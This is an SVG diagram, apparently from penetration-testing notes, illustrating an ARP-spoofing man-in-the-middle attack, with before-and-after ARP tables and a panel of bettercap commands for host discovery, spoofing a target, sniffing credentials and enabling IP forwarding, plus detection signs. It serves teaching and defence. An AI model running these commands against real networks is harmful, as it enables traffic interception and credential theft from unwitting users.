<svg viewBox="0 0 800 400" xmlns="http://www.w3.org/2000/svg"
     style="background:transparent;font-family:'Consolas','Monaco','Courier New',monospace;">
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="9" refY="5"
            markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#abb2bf"/>
    </marker>
    <marker id="arrow-red" viewBox="0 0 10 10" refX="9" refY="5"
            markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#e06c75"/>
    </marker>
    <marker id="arrow-green" viewBox="0 0 10 10" refX="9" refY="5"
            markerWidth="8" markerHeight="8" orient="auto-start-reverse">
      <path d="M 0 0 L 10 5 L 0 10 z" fill="#98c379"/>
    </marker>
  </defs>

  <text x="400" y="26" text-anchor="middle" font-size="15" font-weight="bold" fill="#abb2bf">Post-Connection MitM — ARP Spoofing Topology</text>

  <!-- BEFORE ARP POISON -->
  <text x="185" y="54" text-anchor="middle" font-size="11" fill="#61afef" font-weight="bold">BEFORE: Normal ARP</text>

  <!-- Victim (before) -->
  <rect x="30" y="64" width="130" height="50" rx="6" ry="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="95" y="84" text-anchor="middle" font-size="12" fill="#abb2bf">Victim</text>
  <text x="95" y="99" text-anchor="middle" font-size="10" fill="#abb2bf">192.168.1.10</text>
  <text x="95" y="111" text-anchor="middle" font-size="10" fill="#abb2bf">MAC: AA:BB:CC:11</text>

  <!-- Gateway (before) -->
  <rect x="240" y="64" width="130" height="50" rx="6" ry="6" fill="#61afef" stroke="#4090cf"/>
  <text x="305" y="84" text-anchor="middle" font-size="12" fill="#ffffff">Gateway</text>
  <text x="305" y="99" text-anchor="middle" font-size="10" fill="#ffffff">192.168.1.1</text>
  <text x="305" y="111" text-anchor="middle" font-size="10" fill="#ffffff">MAC: GG:HH:II:01</text>

  <!-- Normal traffic arrow -->
  <line x1="162" y1="89" x2="238" y2="89" stroke="#61afef" stroke-width="2" marker-end="url(#arrow-green)"/>
  <line x1="238" y1="99" x2="162" y2="99" stroke="#61afef" stroke-width="2" marker-end="url(#arrow-green)"/>
  <text x="200" y="86" text-anchor="middle" font-size="9" fill="#61afef">Direct</text>

  <!-- ARP tables (before) -->
  <rect x="30" y="128" width="130" height="44" rx="3" ry="3" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="95" y="144" text-anchor="middle" font-size="9" fill="#abb2bf">ARP Table (Victim):</text>
  <text x="95" y="158" text-anchor="middle" font-size="9" fill="#98c379">192.168.1.1 → GG:HH:II:01</text>
  <text x="95" y="170" text-anchor="middle" font-size="9" fill="#98c379">(correct)</text>

  <rect x="240" y="128" width="130" height="44" rx="3" ry="3" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="305" y="144" text-anchor="middle" font-size="9" fill="#abb2bf">ARP Table (GW):</text>
  <text x="305" y="158" text-anchor="middle" font-size="9" fill="#98c379">192.168.1.10 → AA:BB:CC:11</text>
  <text x="305" y="170" text-anchor="middle" font-size="9" fill="#98c379">(correct)</text>

  <!-- DIVIDER -->
  <line x1="10" y1="188" x2="390" y2="188" stroke="#4b5263" stroke-width="1.5"/>

  <!-- AFTER ARP POISON -->
  <text x="185" y="210" text-anchor="middle" font-size="11" fill="#e06c75" font-weight="bold">AFTER: ARP Poisoning (bettercap)</text>

  <!-- Victim (after) -->
  <rect x="30" y="220" width="130" height="50" rx="6" ry="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="95" y="240" text-anchor="middle" font-size="12" fill="#abb2bf">Victim</text>
  <text x="95" y="255" text-anchor="middle" font-size="10" fill="#abb2bf">192.168.1.10</text>
  <text x="95" y="267" text-anchor="middle" font-size="10" fill="#e5c07b">Thinks GW = Attacker!</text>

  <!-- Attacker (middle) -->
  <rect x="200" y="220" width="130" height="50" rx="6" ry="6" fill="#e06c75" stroke="#c0515f"/>
  <text x="265" y="240" text-anchor="middle" font-size="12" fill="#ffffff">Attacker</text>
  <text x="265" y="255" text-anchor="middle" font-size="10" fill="#ffffff">192.168.1.50</text>
  <text x="265" y="267" text-anchor="middle" font-size="10" fill="#ffffff">MAC: EE:FF:00:99</text>

  <!-- Gateway (after) -->
  <rect x="360" y="220" width="130" height="50" rx="6" ry="6" fill="#61afef" stroke="#4090cf"/>
  <text x="425" y="240" text-anchor="middle" font-size="12" fill="#ffffff">Gateway</text>
  <text x="425" y="255" text-anchor="middle" font-size="10" fill="#ffffff">192.168.1.1</text>
  <text x="425" y="267" text-anchor="middle" font-size="10" fill="#e5c07b">Thinks Victim = Attacker!</text>

  <!-- Poison arrows -->
  <line x1="200" y1="248" x2="162" y2="248" stroke="#e06c75" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#arrow-red)"/>
  <text x="183" y="240" text-anchor="middle" font-size="8" fill="#e06c75">Gratuitous ARP</text>
  <text x="183" y="250" text-anchor="middle" font-size="8" fill="#e06c75">"GW is ME"</text>

  <line x1="330" y1="248" x2="362" y2="248" stroke="#e06c75" stroke-width="2" stroke-dasharray="5,3" marker-end="url(#arrow-red)"/>
  <text x="348" y="240" text-anchor="middle" font-size="8" fill="#e06c75">Gratuitous ARP</text>
  <text x="348" y="250" text-anchor="middle" font-size="8" fill="#e06c75">"Victim is ME"</text>

  <!-- Traffic flow (poisoned) -->
  <line x1="162" y1="280" x2="198" y2="268" stroke="#e06c75" stroke-width="2" marker-end="url(#arrow-red)"/>
  <line x1="332" y1="268" x2="362" y2="280" stroke="#e06c75" stroke-width="2" marker-end="url(#arrow-red)"/>
  <text x="265" y="300" text-anchor="middle" font-size="10" fill="#e06c75">All traffic flows through Attacker → Full MitM</text>

  <!-- ARP tables (poisoned) -->
  <rect x="30" y="314" width="140" height="44" rx="3" ry="3" fill="#4b5263" stroke="#e06c75"/>
  <text x="100" y="330" text-anchor="middle" font-size="9" fill="#abb2bf">ARP Table (Victim):</text>
  <text x="100" y="344" text-anchor="middle" font-size="9" fill="#e06c75">192.168.1.1 → EE:FF:00:99</text>
  <text x="100" y="356" text-anchor="middle" font-size="9" fill="#e06c75">POISONED ☠</text>

  <rect x="350" y="314" width="140" height="44" rx="3" ry="3" fill="#4b5263" stroke="#e06c75"/>
  <text x="420" y="330" text-anchor="middle" font-size="9" fill="#abb2bf">ARP Table (GW):</text>
  <text x="420" y="344" text-anchor="middle" font-size="9" fill="#e06c75">192.168.1.10 → EE:FF:00:99</text>
  <text x="420" y="356" text-anchor="middle" font-size="9" fill="#e06c75">POISONED ☠</text>

  <!-- === BETTERCAP COMMANDS (right side) === -->
  <rect x="510" y="54" width="278" height="310" rx="6" ry="6" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="649" y="74" text-anchor="middle" font-size="11" fill="#abb2bf" font-weight="bold">Bettercap Commands</text>

  <text x="522" y="96" font-size="10" fill="#98c379">## Start bettercap</text>
  <text x="522" y="112" font-size="10" fill="#abb2bf">sudo bettercap -iface wlan1</text>

  <text x="522" y="134" font-size="10" fill="#98c379">## Discover hosts</text>
  <text x="522" y="150" font-size="10" fill="#abb2bf">net.probe on</text>
  <text x="522" y="166" font-size="10" fill="#abb2bf">net.show</text>

  <text x="522" y="188" font-size="10" fill="#98c379">## ARP spoof (single target)</text>
  <text x="522" y="204" font-size="10" fill="#abb2bf">set arp.spoof.targets 192.168.1.10</text>
  <text x="522" y="220" font-size="10" fill="#abb2bf">set arp.spoof.fullduplex true</text>
  <text x="522" y="236" font-size="10" fill="#abb2bf">arp.spoof on</text>

  <text x="522" y="258" font-size="10" fill="#98c379">## Sniff credentials</text>
  <text x="522" y="274" font-size="10" fill="#abb2bf">net.sniff on</text>
  <text x="522" y="290" font-size="10" fill="#abb2bf">set net.sniff.verbose true</text>

  <text x="522" y="312" font-size="10" fill="#e5c07b">## IP forwarding (critical!)</text>
  <text x="522" y="328" font-size="10" fill="#abb2bf">echo 1 &gt; /proc/sys/net/</text>
  <text x="522" y="344" font-size="10" fill="#abb2bf">  ipv4/ip_forward</text>

  <text x="522" y="362" font-size="10" fill="#e06c75">## Detection signatures:</text>
  <text x="522" y="378" font-size="10" fill="#abb2bf">Duplicate IP warnings</text>
  <text x="522" y="394" font-size="10" fill="#abb2bf">ARP table MAC changes</text>

  <!-- Legend at bottom -->
  <rect x="10" y="370" width="490" height="22" rx="3" ry="3" fill="#4b5263" stroke="#3a3f4b"/>
  <text x="255" y="385" text-anchor="middle" font-size="10" fill="#abb2bf">Key: ip_forward=1 required so victim traffic is relayed (not dropped) — disable after engagement</text>
</svg>
